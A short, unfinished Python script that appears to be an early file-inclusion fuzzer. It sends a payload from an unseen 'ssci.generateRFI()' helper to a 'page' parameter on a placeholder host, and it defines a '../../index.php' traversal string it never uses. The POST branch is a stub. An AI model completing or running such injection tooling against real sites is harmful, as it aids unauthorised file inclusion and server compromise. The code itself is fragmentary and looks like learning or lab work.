import requests
import ssci

BASE_URL = "http://target.com"

def injectPayload(url, paramname, method, payload):
	#finds index.php at base
	parsedURL = BASE_URL + url	
	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload
		content = requests.get(getURL)
		print getURL
		print content.text
		#instead of printing, i want to return the payload if true!

	#if post
	elif method == "POST":
		print("POST")


if __name__ == "__main__":
	
	url = "/serverside/rfi.php"
	payload = "../../index.php"
	injectPayload(url, "page", "GET", ssci.generateRFI())
